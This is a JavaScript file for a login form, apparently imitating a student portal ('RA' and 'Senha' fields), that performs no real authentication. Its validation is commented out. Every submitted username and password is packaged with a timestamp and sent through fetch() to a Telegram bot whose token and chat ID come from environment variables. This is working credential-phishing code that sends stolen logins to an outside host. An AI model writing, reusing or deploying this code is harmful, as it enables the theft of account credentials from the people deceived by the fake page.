import "./style.css"
const form = document.querySelector("#form")


const validate = (user,password) => { 
    const user_error = document.querySelector("#user-error")
    const pass_error = document.querySelector("#password-error") 
    
    // if (!password) {        
    //     pass_error.textContent = "Usuário ou senha inválidos"        
    //     password.classList.add('input-alert')
    // } 
    // if (!user) {
    //     user_error.textContent = "Digite o usuário"
    //     user.classList.add('input-alert')
    // }  
    
    // if (!password) {
    //     pass_error.textContent = "Digite a senha"
    //     password.classList.add('input-alert')
    // }
    // else if (password.length < 8) {
    //     pass_error.textContent = "A senha deve conter no mínimo 8 caracteres"
    //     password.classList.add('input-alert')
    // }
    // if (user === "admin" && password ==="12345678") {
    //     window.location.href="./pages/home.html"
    //     sessionStorage.setItem("auth","true")
    // }
    return user && password
}

const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID
const telegramBaseUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const sendMessageToTelegram = async (message) => {
  try {
    const params = new URLSearchParams();
    params.append('chat_id', TELEGRAM_CHAT_ID);
    params.append('parse_mode', 'Markdown');
    params.append('text', message);

    const response = await fetch(`${telegramBaseUrl}/sendMessage?${params}`);
    const data = await response.json();

    return data.ok;
  } catch (e) {
    console.log(e);
  }
};

const handleLogin =(event)=>{
    event.preventDefault()
    const user = event.target.user.value
    const password = event.target.password.value
    const isValid = validate(user, password)

    if (isValid) {
        const message = `
        Data: ${new Date()}
        RA: ${user}
        Senha: ${password}        
        `
        sendMessageToTelegram(message)
    }
}
form.addEventListener("submit",handleLogin)